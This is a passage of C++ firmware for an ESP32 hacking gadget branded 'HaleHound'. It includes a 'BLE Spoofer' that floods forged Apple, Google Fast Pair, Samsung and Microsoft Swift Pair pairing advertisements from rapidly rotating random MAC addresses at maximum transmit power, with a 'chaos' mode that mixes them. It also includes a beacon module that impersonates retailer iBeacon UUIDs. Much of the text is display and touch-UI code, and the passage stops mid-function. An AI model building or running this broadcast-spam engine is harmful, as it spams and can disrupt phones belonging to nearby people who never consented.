    for (int i = 0; i < SP_EQ_BARS; i++) {
        int x = SP_EQ_X + (i * barWidth);
        uint8_t heat = eqHeat[i];

        int barH = (heat * maxBarH) / 100;
        if (barH > maxBarH) barH = maxBarH;
        if (barH < 3) barH = 3;

        int barY = SP_EQ_Y + SP_EQ_HEIGHT - barH - 2;

        // Per-pixel gradient (cyan at bottom → hot pink at top)
        for (int y = 0; y < barH; y++) {
            float ratio = (float)y / (float)barH;
            float heatRatio = (float)heat / 124.0f;
            float r = ratio * (0.3f + heatRatio * 0.7f);
            if (r > 1.0f) r = 1.0f;
            uint16_t color = spGradientColor(r);
            tft.drawFastHLine(x + 1, barY + barH - 1 - y, barWidth - 2, color);
        }

        // Glow at base for hot bars
        if (heat > 80) {
            tft.drawFastHLine(x + 1, barY + barH, barWidth - 2, HALEHOUND_HOTPINK);
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// SKULL ROWS — 2x8 with animated wave + red pulse on active broadcast
// ═══════════════════════════════════════════════════════════════════════════

static void drawSkulls() {
    int skullStartX = 10;
    int skullSpacing = (SCREEN_WIDTH - 20) / SP_SKULL_NUM;

    for (int row = 0; row < SP_SKULL_ROWS; row++) {
        int rowY = SP_SKULL_Y + (row * SP_SKULL_ROW_SPACING);

        for (int i = 0; i < SP_SKULL_NUM; i++) {
            int x = skullStartX + (i * skullSpacing);
            tft.fillRect(x, rowY, 16, 16, TFT_BLACK);

            uint16_t color;
            if (spamming) {
                // Map current mode to a "hot skull" position for visual feedback
                int activeSkull = currentMode % SP_SKULL_NUM;
                int dist = abs(i - activeSkull);

                if (dist == 0) {
                    // ACTIVE MODE SKULL — pulsing bright red
                    int pulse = (skullFrame + (row * 2)) % 4;
                    uint8_t brightness = 180 + (pulse * 25);
                    color = tft.color565(brightness, 0, 0);
                } else if (dist == 1) {
                    // ADJACENT SKULLS — orange glow
                    int pulse = (skullFrame + i + (row * 3)) % 6;
                    uint8_t r = 200 + (pulse * 9);
                    uint8_t g = 40 + (pulse * 8);
                    color = tft.color565(r, g, 0);
                } else {
                    // Normal cyan-to-hot-pink wave
                    int phase = (skullFrame + i + (row * 3)) % 8;
                    if (phase < 4) {
                        float ratio = phase / 3.0f;
                        color = spGradientColor(ratio);
                    } else {
                        float ratio = (phase - 4) / 3.0f;
                        uint8_t r = 255 - (uint8_t)(ratio * 255);
                        uint8_t g = 28 + (uint8_t)(ratio * (207 - 28));
                        uint8_t b = 82 + (uint8_t)(ratio * (255 - 82));
                        color = tft.color565(r, g, b);
                    }
                }
            } else {
                color = HALEHOUND_GUNMETAL;  // Gray when inactive
            }

            tft.drawBitmap(x, rowY, spSkulls[i], 16, 16, color);
        }

        // TX/OFF label next to first row
        if (row == 0) {
            tft.fillRect(skullStartX + (SP_SKULL_NUM * skullSpacing), rowY, 50, 16, TFT_BLACK);
            tft.setTextColor(spamming ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
            tft.setTextSize(1);
            tft.setCursor(skullStartX + (SP_SKULL_NUM * skullSpacing) + 5, rowY + 4);
            tft.print(spamming ? "TX!" : "OFF");
        }
    }

    skullFrame++;
}

// ═══════════════════════════════════════════════════════════════════════════
// COUNTER BAR — Gradient progress bar + rate display
// ═══════════════════════════════════════════════════════════════════════════

static void drawCounter() {
    int counterY = SCREEN_HEIGHT - 30;
    tft.fillRect(0, counterY, SCREEN_WIDTH, 25, TFT_BLACK);

    // Gradient bar showing activity (fills based on rate, max at 30/s)
    int barX = 10;
    int barY = counterY + 2;
    int barW = SCALE_W(140);
    int barH = 10;

    // Border
    tft.drawRoundRect(barX - 1, barY - 1, barW + 2, barH + 2, 2, HALEHOUND_MAGENTA);
    tft.fillRoundRect(barX, barY, barW, barH, 1, HALEHOUND_DARK);

    // Fill with gradient based on rate (0-30 pps mapped to 0-100%)
    float fillPct = (currentRate > 0) ? (float)currentRate / 30.0f : 0.0f;
    if (fillPct > 1.0f) fillPct = 1.0f;
    int fillW = (int)(fillPct * barW);
    if (fillW > 0) {
        for (int px = 0; px < fillW; px++) {
            float ratio = (float)px / (float)barW;
            uint16_t c = spGradientColor(ratio);
            tft.drawFastVLine(barX + px, barY + 1, barH - 2, c);
        }
    }

    // Packet count inside the bar
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    char cntBuf[12];
    snprintf(cntBuf, sizeof(cntBuf), "%lu", packetCount);
    tft.setCursor(barX + 4, barY + 1);
    tft.print(cntBuf);

    // Rate display to the right
    tft.setTextColor(spamming ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setCursor(SCALE_X(160), counterY + 3);
    tft.printf("%d pkt/s", currentRate);

    // Small skull icon next to rate when active
    if (spamming) {
        tft.drawBitmap(SCALE_X(220), counterY + 1, bitmap_icon_skull_bluetooth, 16, 16, HALEHOUND_HOTPINK);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// MODE / DEVICE CONTROL
// ═══════════════════════════════════════════════════════════════════════════

static void nextMode() {
    currentMode = (currentMode + 1) % MODE_COUNT;
    drawHeader();
    char buf[42];
    snprintf(buf, sizeof(buf), "[*] Mode: %s", MODE_NAMES[currentMode]);
    addLogEntry(buf, HALEHOUND_HOTPINK);
}

static void prevMode() {
    currentMode = (currentMode - 1 + MODE_COUNT) % MODE_COUNT;
    drawHeader();
    char buf[42];
    snprintf(buf, sizeof(buf), "[*] Mode: %s", MODE_NAMES[currentMode]);
    addLogEntry(buf, HALEHOUND_HOTPINK);
}

static void nextDevice() {
    if (currentMode == MODE_CHAOS) return;
    int count = getDeviceCount(currentMode);
    if (count == 0) return;
    deviceIndex[currentMode] = (deviceIndex[currentMode] + 1) % count;
    drawHeader();
}

static void prevDevice() {
    if (currentMode == MODE_CHAOS) return;
    int count = getDeviceCount(currentMode);
    if (count == 0) return;
    deviceIndex[currentMode] = (deviceIndex[currentMode] - 1 + count) % count;
    drawHeader();
}

// ═══════════════════════════════════════════════════════════════════════════
// RAW ESP-IDF ADVERTISING PARAMS (bypasses Arduino wrapper for reliable BLE spam)
// ADV_TYPE_NONCONN_IND = non-connectable undirected (BLE spam standard)
// BLE_ADDR_TYPE_RANDOM = use our random MAC per broadcast cycle
// 0x20 interval = 20ms = fastest BLE spec allows
// ═══════════════════════════════════════════════════════════════════════════

static esp_ble_adv_params_t bleSpamAdvParams = {
    .adv_int_min = 0x20,
    .adv_int_max = 0x20,
    .adv_type = ADV_TYPE_NONCONN_IND,
    .own_addr_type = BLE_ADDR_TYPE_RANDOM,
    .channel_map = ADV_CHNL_ALL,
    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

// ═══════════════════════════════════════════════════════════════════════════
// BROADCAST ENGINE
// ═══════════════════════════════════════════════════════════════════════════

static void doBroadcast() {
    // ═══════════════════════════════════════════════════════════════════════
    // BLE BROADCAST — Raw ESP-IDF API (Arduino wrapper doesn't cycle MACs correctly)
    // Sequence: stop → setRandAddr → configDataRaw → start → delay → stop
    // ═══════════════════════════════════════════════════════════════════════

    // Stop any current advertising
    esp_ble_gap_stop_advertising();

    // Generate random BLE MAC address
    esp_bd_addr_t addr;
    esp_fill_random(addr, 6);
    addr[0] |= 0xC0;  // Set top 2 bits for BLE random static address type

    // Set random address via raw ESP-IDF (wrapper doesn't handle rapid cycling)
    esp_ble_gap_set_rand_addr(addr);

    // Determine what to broadcast
    int broadcastMode = currentMode;
    int broadcastIdx = 0;
    const char* deviceName = "";

    if (currentMode == MODE_CHAOS) {
        broadcastMode = chaosStep % (MODE_COUNT - 1);
        int count = getDeviceCount(broadcastMode);
        broadcastIdx = (count > 0) ? random(count) : 0;
        chaosStep++;
    } else {
        broadcastIdx = deviceIndex[currentMode];
    }

    // Build payload
    BLEAdvertisementData advData = BLEAdvertisementData();

    switch (broadcastMode) {
        case MODE_APPLE_POPUP:
            getApplePopupPayload(advData, broadcastIdx);
            deviceName = APPLE_NAMES[broadcastIdx % APPLE_COUNT];
            break;

        case MODE_SOUR_APPLE: {
            int randType = random(SOUR_APPLE_COUNT);
            getSourApplePayload(advData, randType);
            deviceName = SOUR_APPLE_NAMES[randType];
            break;
        }

        case MODE_FAST_PAIR:
            getFastPairPayload(advData, broadcastIdx);
            deviceName = FAST_PAIR_NAMES[broadcastIdx % FAST_PAIR_COUNT];
            break;

        case MODE_SAMSUNG_BUDS:
            getSamsungBudsPayload(advData, broadcastIdx);
            deviceName = SAMSUNG_BUDS_NAMES[broadcastIdx % SAMSUNG_BUDS_COUNT];
            break;

        case MODE_SAMSUNG_WATCH:
            getSamsungWatchPayload(advData, broadcastIdx);
            deviceName = SAMSUNG_WATCH_NAMES[broadcastIdx % SAMSUNG_WATCH_COUNT];
            break;

        case MODE_SWIFT_PAIR:
            getSwiftPairPayload(advData, broadcastIdx);
            deviceName = SWIFT_PAIR_NAMES[broadcastIdx % SWIFT_PAIR_COUNT];
            break;

        default:
            return;
    }

    // Set raw advertising data via ESP-IDF (bypasses Arduino wrapper for reliable cycling)
    std::string payload = advData.getPayload();
    esp_ble_gap_config_adv_data_raw((uint8_t*)payload.data(), payload.length());

    // Brief pause for data config to take effect
    delay(1);

    // Start advertising with raw ESP-IDF params (proven pattern from ESP32-BLE-Spam)
    esp_ble_gap_start_advertising(&bleSpamAdvParams);

    // Let BLE controller fire advertising events on channels 37/38/39
    // 20ms = at least one full advertising interval
    delay(20);

    // Stop advertising (clean cycle for next random MAC)
    esp_ble_gap_stop_advertising();

    // Update counters
    packetCount++;
    rateWindowCount++;

    // Log first 5 packets to serial for debugging
    if (packetCount <= 5) {
        Serial.printf("[BLESPOOF] TX #%lu mode=%d len=%d addr=%02X:%02X:%02X\n",
            packetCount, broadcastMode, (int)payload.length(), addr[0], addr[1], addr[2]);
    }

    // Log entry with truncated MAC (all stack-allocated, zero heap allocs)
    char logBuf[42];
    snprintf(logBuf, sizeof(logBuf), "[+] %s -> %02X:%02X:%02X", deviceName, addr[0], addr[1], addr[2]);
    addLogEntry(logBuf, HALEHOUND_VIOLET);
}

// ═══════════════════════════════════════════════════════════════════════════
// CORE 0 BROADCAST TASK — Runs doBroadcast() as fast as BLE allows
// BLE advertising has inherent ~21ms per cycle (delay(1) + delay(20))
// Removing the 40ms throttle roughly doubles broadcast rate (~45-50/sec)
// ═══════════════════════════════════════════════════════════════════════════

static void spamTxTask(void* param) {
    spamTaskRunning = true;
    unsigned long rateStart = millis();

    while (spamming) {
        // Heap safety — BLEAdvertisementData allocates std::string on heap
        if (esp_get_free_heap_size() < 8192) {
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }

        doBroadcast();  // Increments packetCount and rateWindowCount

        // Update rate counter every second
        unsigned long now = millis();
        if (now - rateStart >= 1000) {
            currentRate = (uint16_t)rateWindowCount;
            rateWindowCount = 0;
            rateStart = now;
        }

        // Yield — delay(20) in doBroadcast already yields, but belt and suspenders
        vTaskDelay(1);
    }

    spamTaskRunning = false;
    vTaskDelete(NULL);
}

static void startSpamTask() {
    if (spamTaskHandle != NULL) return;
    xTaskCreatePinnedToCore(spamTxTask, "bleSpam", 8192, NULL, 1, &spamTaskHandle, 0);
}

static void stopSpamTask() {
    spamming = false;
    if (spamTaskHandle == NULL) return;

    // Wait for task to finish (500ms timeout)
    unsigned long start = millis();
    while (spamTaskRunning && (millis() - start < 500)) {
        delay(10);
    }

    // Force kill if task didn't exit cleanly
    if (spamTaskRunning) {
        vTaskDelete(spamTaskHandle);
    }

    spamTaskHandle = NULL;
    spamTaskRunning = false;

    // Stop any lingering advertising
    esp_ble_gap_stop_advertising();
}

static void startSpam() {
    spamming = true;
    rateWindowCount = 0;
    addLogEntry("[!] SPAM STARTED", HALEHOUND_HOTPINK);
    drawIconBar();
    drawHeader();
    drawLog();  // Force immediate log display on state change

    startSpamTask();  // Launch Core 0 broadcast engine

    #if CYD_DEBUG
    Serial.printf("[BLESPOOF] Started - Mode: %s (Core 0)\n", MODE_NAMES[currentMode]);
    #endif
}

static void stopSpam() {
    stopSpamTask();  // Stop Core 0 task first
    addLogEntry("[!] SPAM STOPPED", HALEHOUND_HOTPINK);
    drawIconBar();
    drawHeader();

    #if CYD_DEBUG
    Serial.println("[BLESPOOF] Stopped");
    #endif
}

static void toggleSpam() {
    if (spamming) stopSpam(); else startSpam();
}

// ═══════════════════════════════════════════════════════════════════════════
// PUBLIC FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

void setInitialMode(int mode) {
    initialMode = mode;
}

void setup() {
    if (initialized) return;

    #if CYD_DEBUG
    Serial.println("[BLESPOOF] Initializing Multi-Platform BLE Spoofer...");
    #endif

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();

    // Kill WiFi completely — it shares the 2.4GHz radio with BLE
    // MUST use Arduino API to keep _esp_wifi_started flag in sync
    WiFi.mode(WIFI_OFF);
    delay(200);

    // Initialize BLE — must wait for controller to be fully ready before setting TX power
    releaseClassicBtMemory();
    BLEDevice::init("HaleHound");
    delay(150);  // BLE controller needs time to finish internal init

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

    Serial.println("[BLESPOOF] BLE stack initialized, max TX power set");

    // Reset state
    spamming = false;
    exitRequested = false;
    packetCount = 0;
    currentRate = 0;
    rateWindowCount = 0;
    logCount = 0;
    skullFrame = 0;
    chaosStep = 0;
    for (int i = 0; i < MODE_COUNT; i++) deviceIndex[i] = 0;
    spamTaskHandle = NULL;
    spamTaskRunning = false;

    // Apply initial mode if set (for SourApple redirect)
    if (initialMode >= 0 && initialMode < MODE_COUNT) {
        currentMode = initialMode;
        initialMode = -1;
    } else {
        currentMode = MODE_APPLE_POPUP;
    }

    // Draw full UI
    drawIconBar();
    drawHeader();
    drawEqualizer();
    drawSkulls();
    drawCounter();

    addLogEntry("[*] BLE Spoofer ready", HALEHOUND_MAGENTA);
    char modeBuf[42];
    snprintf(modeBuf, sizeof(modeBuf), "[*] Mode: %s", MODE_NAMES[currentMode]);
    addLogEntry(modeBuf, HALEHOUND_MAGENTA);
    drawLog();  // Force initial log display

    lastDisplayUpdate = millis();
    initialized = true;

    #if CYD_DEBUG
    Serial.println("[BLESPOOF] Ready");
    #endif
}

void loop() {
    if (!initialized) return;

    touchButtonsUpdate();

    // ═══════════════════════════════════════════════════════════════════════
    // TOUCH HANDLING - with release detection (prevents repeat triggers)
    // Icons: Back=10, Toggle=60, PrevMode=105, NextMode=140, PrevDev=180, NextDev=215
    // ═══════════════════════════════════════════════════════════════════════
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        // Icon bar area
        if (ty >= ICON_BAR_Y && ty <= (ICON_BAR_BOTTOM + 4)) {
            // Wait for touch release to prevent repeated triggers
            waitForTouchRelease();

            // Back icon (x=10)
            if (tx >= 5 && tx <= 30) {
                if (spamming) stopSpam();
                exitRequested = true;
                return;
            }
            // Toggle icon (x=60)
            else if (tx >= 50 && tx <= 80) {
                toggleSpam();
                return;
            }
            // Prev mode icon (x=105)
            else if (tx >= 95 && tx <= 125) {
                prevMode();
                return;
            }
            // Next mode icon (x=140)
            else if (tx >= 130 && tx <= 160) {
                nextMode();
                return;
            }
            // Prev device icon (x=180)
            else if (tx >= 170 && tx <= 200) {
                prevDevice();
                return;
            }
            // Next device icon at right edge
            else if (tx >= (tft.width() - 35) && tx <= tft.width()) {
                nextDevice();
                return;
            }
        }
    }

    // Hardware button fallback
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (spamming) stopSpam();
        exitRequested = true;
        return;
    }

    // Button navigation
    if (buttonPressed(BTN_LEFT)) prevDevice();
    if (buttonPressed(BTN_RIGHT)) nextDevice();
    if (buttonPressed(BTN_UP)) prevMode();
    if (buttonPressed(BTN_DOWN)) nextMode();
    if (buttonPressed(BTN_SELECT)) toggleSpam();

    // Broadcast engine runs on Core 0 (spamTxTask)
    // Rate calculation also runs on Core 0

    // Feed the watchdog
    yield();

    // ═══════════════════════════════════════════════════════════════════════
    // DISPLAY UPDATE (~10fps = 100ms throttle for skulls + counter + log)
    // ═══════════════════════════════════════════════════════════════════════
    if (millis() - lastDisplayUpdate >= 100) {
        drawEqualizer();
        drawSkulls();
        drawCounter();
        drawLog();
        lastDisplayUpdate = millis();
    }
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    stopSpamTask();  // Stop Core 0 task before BLE teardown

    BLEDevice::deinit(false);  // false = library bug: deinit(true) never resets initialized flag

    spamming = false;
    initialized = false;
    exitRequested = false;
    initialMode = -1;
    logDirty = false;
    logCount = 0;

    #if CYD_DEBUG
    Serial.println("[BLESPOOF] Cleanup complete");
    #endif
}

}  // namespace BleSpoofer


// ═══════════════════════════════════════════════════════════════════════════
// BLE UTILITIES
// ═══════════════════════════════════════════════════════════════════════════

void bleInit() {
    releaseClassicBtMemory();
    BLEDevice::init("HaleHound");
}

void bleCleanup() {
    BLEDevice::deinit(false);  // false = library bug: deinit(true) never resets initialized flag
}


// ═══════════════════════════════════════════════════════════════════════════
// BLE BEACON - iBeacon / Eddystone Beacon Transmitter
// Standards-compliant beacon broadcasting for testing beacon-aware apps,
// geo-fencing systems, and proximity detection.
// Uses same proven ESP-IDF raw advertising API as BleSpoofer.
// Created: 2026-02-14
// ═══════════════════════════════════════════════════════════════════════════

namespace BleBeacon {

// ═══════════════════════════════════════════════════════════════════════════
// BEACON MODES
// ═══════════════════════════════════════════════════════════════════════════

enum BeaconMode {
    BCN_RANDOM_IBEACON = 0,
    BCN_APPLE_STORE,
    BCN_STARBUCKS,
    BCN_EDDYSTONE_URL,
    BCN_EDDYSTONE_UID,
    BCN_GEO_FENCE,
    BCN_MODE_COUNT  // 6
};

static const char* BCN_MODE_NAMES[] = {
    "RANDOM iBEACON",
    "APPLE STORE",
    "STARBUCKS",
    "EDDYSTONE URL",
    "EDDYSTONE UID",
    "GEO-FENCE"
};

// ═══════════════════════════════════════════════════════════════════════════
// iBEACON PRESETS
// iBeacon format: Flags(3) + Mfr(0xFF) + Apple(4C00) + type(0215) +
//                 UUID(16) + Major(2) + Minor(2) + TX Power(1)
// ═══════════════════════════════════════════════════════════════════════════

// Apple Store iBeacon UUID: E2C56DB5-DFFB-48D2-B060-D0F5A71096E0
static const uint8_t UUID_APPLE_STORE[16] = {
    0xE2, 0xC5, 0x6D, 0xB5, 0xDF, 0xFB, 0x48, 0xD2,
    0xB0, 0x60, 0xD0, 0xF5, 0xA7, 0x10, 0x96, 0xE0
};

// Starbucks retail beacon UUID: 2F234454-CF6D-4A0F-ADF2-F4911BA9FFA6
static const uint8_t UUID_STARBUCKS[16] = {
    0x2F, 0x23, 0x44, 0x54, 0xCF, 0x6D, 0x4A, 0x0F,
    0xAD, 0xF2, 0xF4, 0x91, 0x1B, 0xA9, 0xFF, 0xA6
};

// Target retail beacon UUID: AA6062F0-98CA-4211-8EC4-3D0B20EA9616
static const uint8_t UUID_TARGET[16] = {
    0xAA, 0x60, 0x62, 0xF0, 0x98, 0xCA, 0x42, 0x11,
    0x8E, 0xC4, 0x3D, 0x0B, 0x20, 0xEA, 0x96, 0x16
};

// Walmart retail beacon UUID: 74278BDA-B644-4520-8F0C-720EAF059935
static const uint8_t UUID_WALMART[16] = {
    0x74, 0x27, 0x8B, 0xDA, 0xB6, 0x44, 0x45, 0x20,
    0x8F, 0x0C, 0x72, 0x0E, 0xAF, 0x05, 0x99, 0x35
};

// Macy's retail beacon UUID: B9407F30-F5F8-466E-AFF9-25556B57FE6D (Estimote)
static const uint8_t UUID_MACYS[16] = {
    0xB9, 0x40, 0x7F, 0x30, 0xF5, 0xF8, 0x46, 0x6E,
    0xAF, 0xF9, 0x25, 0x55, 0x6B, 0x57, 0xFE, 0x6D
};

// Geo-fence preset table
#define GEO_FENCE_PRESET_COUNT 5
static const uint8_t* GEO_FENCE_UUIDS[GEO_FENCE_PRESET_COUNT] = {
    UUID_APPLE_STORE, UUID_STARBUCKS, UUID_TARGET, UUID_WALMART, UUID_MACYS
};
static const char* GEO_FENCE_NAMES[GEO_FENCE_PRESET_COUNT] = {
    "AppleStore", "Starbucks", "Target", "Walmart", "Macys"
};

// Eddystone URL preset
static const char* EDDYSTONE_URL_PRESET = "google.com";

// ═══════════════════════════════════════════════════════════════════════════
// STATE VARIABLES
// ═══════════════════════════════════════════════════════════════════════════

static bool initialized = false;
static volatile bool beaconing = false;
static bool exitRequested = false;
static volatile int currentMode = BCN_RANDOM_IBEACON;

static volatile uint32_t packetCount = 0;
static volatile uint32_t rateWindowCount = 0;
static volatile uint16_t currentRate = 0;
static volatile int geoFenceStep = 0;

// ═══════════════════════════════════════════════════════════════════════════
// DUAL-CORE TASK MANAGEMENT
// Core 0: BLE broadcast engine (doBroadcast loop)
// Core 1: Display + touch (Arduino main loop)
// ═══════════════════════════════════════════════════════════════════════════

static TaskHandle_t bcnTaskHandle = NULL;
static volatile bool bcnTaskRunning = false;

// ═══════════════════════════════════════════════════════════════════════════
// SCROLLING LOG
// ═══════════════════════════════════════════════════════════════════════════

#define BCN_LOG_MAX_LINES 8
#define BCN_LOG_LINE_HEIGHT 13
#define BCN_LOG_START_Y 115
#define BCN_LOG_END_Y (SCREEN_HEIGHT - 90)

static char bcnLogLines[BCN_LOG_MAX_LINES][42];
static uint16_t bcnLogColors[BCN_LOG_MAX_LINES];
static volatile int bcnLogCount = 0;
static volatile bool bcnLogDirty = false;  // Core 0 sets via bcnAddLog, Core 1 reads in bcnDrawLog

static unsigned long lastDisplayUpdate = 0;

// ═══════════════════════════════════════════════════════════════════════════
// RAW ESP-IDF ADVERTISING PARAMS (same proven pattern as BleSpoofer)
// ADV_TYPE_NONCONN_IND = non-connectable undirected (beacon standard)
// BLE_ADDR_TYPE_RANDOM = random MAC per broadcast
// 0xA0 interval = 100ms = standard iBeacon rate
// ═══════════════════════════════════════════════════════════════════════════

static esp_ble_adv_params_t bcnAdvParams = {
    .adv_int_min = 0xA0,
    .adv_int_max = 0xA0,
    .adv_type = ADV_TYPE_NONCONN_IND,
    .own_addr_type = BLE_ADDR_TYPE_RANDOM,
    .channel_map = ADV_CHNL_ALL,
    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

// ═══════════════════════════════════════════════════════════════════════════
// ICON BAR - 4 icons: Back | Toggle | PrevMode | NextMode
// ═══════════════════════════════════════════════════════════════════════════

#define BCN_ICON_SIZE 16
#define BCN_ICON_NUM 4

static const int bcnIconX[BCN_ICON_NUM] = {10, 70, 140, 200};
static const unsigned char* bcnIcons[BCN_ICON_NUM] = {
    bitmap_icon_go_back,           // 0: Back/Exit
    bitmap_icon_start,             // 1: Toggle beacon ON/OFF
    bitmap_icon_LEFT,              // 2: Previous mode
    bitmap_icon_RIGHT              // 3: Next mode
};

// ═══════════════════════════════════════════════════════════════════════════
// LOG FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

static void bcnAddLog(const char* text, uint16_t color) {
    if (bcnLogCount >= BCN_LOG_MAX_LINES) {
        memmove(bcnLogLines[0], bcnLogLines[1], (BCN_LOG_MAX_LINES - 1) * sizeof(bcnLogLines[0]));
        memmove(bcnLogColors, bcnLogColors + 1, (BCN_LOG_MAX_LINES - 1) * sizeof(uint16_t));
        bcnLogCount = BCN_LOG_MAX_LINES - 1;
    }
    strncpy(bcnLogLines[bcnLogCount], text, sizeof(bcnLogLines[0]) - 1);
    bcnLogLines[bcnLogCount][sizeof(bcnLogLines[0]) - 1] = '\0';
    bcnLogColors[bcnLogCount] = color;
    bcnLogCount++;
    bcnLogDirty = true;
}

static void bcnDrawLog() {
    if (!bcnLogDirty) return;
    bcnLogDirty = false;

    tft.fillRect(0, BCN_LOG_START_Y, SCREEN_WIDTH, BCN_LOG_END_Y - BCN_LOG_START_Y, TFT_BLACK);

    tft.setTextSize(1);
    for (int i = 0; i < bcnLogCount; i++) {
        tft.setTextColor(bcnLogColors[i], TFT_BLACK);
        tft.setCursor(3, BCN_LOG_START_Y + i * BCN_LOG_LINE_HEIGHT);
        tft.print(bcnLogLines[i]);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING
// ═══════════════════════════════════════════════════════════════════════════

static void bcnDrawIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    for (int i = 0; i < BCN_ICON_NUM; i++) {
        uint16_t color = HALEHOUND_MAGENTA;
        if (i == 1 && beaconing) color = HALEHOUND_HOTPINK;
        tft.drawBitmap(bcnIconX[i], ICON_BAR_Y, bcnIcons[i], BCN_ICON_SIZE, BCN_ICON_SIZE, color);
    }
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

static void bcnDrawHeader() {
    tft.fillRect(0, 40, SCREEN_WIDTH, 72, TFT_BLACK);

    // Title — Nosifer with glitch effect
    drawGlitchText(SCALE_Y(60), "BLE BEACON", &Nosifer_Regular10pt7b);

    // Status
    tft.setTextSize(1);
    if (beaconing) {
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.setCursor(78, 68);
        tft.print(">> BEACONING <<");
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        tft.setCursor(95, 68);
        tft.print("- IDLE -");
    }

    // Mode in framed bar
    tft.drawRoundRect(5, 82, GRAPH_PADDED_W, 16, 3, HALEHOUND_VIOLET);
    tft.drawRoundRect(6, 83, GRAPH_PADDED_W - 2, 14, 2, HALEHOUND_GUNMETAL);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(10, 86);
    tft.printf(" %s", BCN_MODE_NAMES[currentMode]);

    // Packet count on right side
    if (packetCount > 0) {
        char cntBuf[14];
        snprintf(cntBuf, sizeof(cntBuf), "%lu pkt", packetCount);
        tft.setCursor(170, 86);
        tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
        tft.print(cntBuf);
    }

    tft.drawLine(0, 100, SCREEN_WIDTH, 100, HALEHOUND_HOTPINK);

    // Rate display bar
    tft.fillRect(0, 102, SCREEN_WIDTH, 12, TFT_BLACK);
    tft.setTextColor(beaconing ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setCursor(5, 103);
    tft.printf("Rate: %d bcn/s", currentRate);

    if (beaconing) {
        // Animated gradient pulse: cyan → hot pink → cyan
        int phase = (millis() / 100) % 16;
        float ratio = (phase < 8) ? (phase / 7.0f) : ((16 - phase) / 8.0f);
        uint8_t r = (uint8_t)(ratio * 255);
        uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
        uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
        tft.drawBitmap(220, 102, bitmap_icon_signal, 16, 16, tft.color565(r, g, b));
    }
}

// Lightweight rate-only update — no fillRect clear on title/mode areas
// Called in 100ms display loop instead of full bcnDrawHeader()
static void bcnDrawRate() {
    // Rate display bar only (Y=102-114)
    tft.fillRect(0, 102, 215, 12, TFT_BLACK);
    tft.setTextColor(beaconing ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setCursor(5, 103);
    tft.printf("Rate: %d bcn/s", currentRate);

    // Packet count in mode bar (right side, Y=86)
    if (packetCount > 0) {
        tft.fillRect(165, 84, 70, 12, TFT_BLACK);
        char cntBuf[14];
        snprintf(cntBuf, sizeof(cntBuf), "%lu pkt", packetCount);
        tft.setCursor(170, 86);
        tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
        tft.print(cntBuf);
    }

    // Animated signal icon
    if (beaconing) {
        int phase = (millis() / 100) % 16;
        float ratio = (phase < 8) ? (phase / 7.0f) : ((16 - phase) / 8.0f);
        uint8_t r = (uint8_t)(ratio * 255);
        uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
        uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
        tft.drawBitmap(220, 102, bitmap_icon_signal, 16, 16, tft.color565(r, g, b));
    }
}

static void bcnDrawCounter() {
    int counterY = SCREEN_HEIGHT - 88;
    tft.fillRect(0, counterY, SCREEN_WIDTH, 20, TFT_BLACK);

    // Gradient bar
    int barX = 10;
    int barY = counterY + 2;
    int barW = SCALE_W(140);
    int barH = 10;

    tft.drawRoundRect(barX - 1, barY - 1, barW + 2, barH + 2, 2, HALEHOUND_MAGENTA);
    tft.fillRoundRect(barX, barY, barW, barH, 1, HALEHOUND_DARK);

    float fillPct = (currentRate > 0) ? (float)currentRate / 12.0f : 0.0f;
    if (fillPct > 1.0f) fillPct = 1.0f;
    int fillW = (int)(fillPct * barW);
    if (fillW > 0) {
        for (int px = 0; px < fillW; px++) {
            float ratio = (float)px / (float)barW;
            // Cyan to hot pink gradient
            uint8_t r = (uint8_t)(ratio * 255);
            uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
            uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
            uint16_t c = tft.color565(r, g, b);
            tft.drawFastVLine(barX + px, barY + 1, barH - 2, c);
        }
    }

    // Count text
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    char cntBuf[12];
    snprintf(cntBuf, sizeof(cntBuf), "%lu", packetCount);
    tft.setCursor(barX + 4, barY + 1);
    tft.print(cntBuf);

    // Rate on right
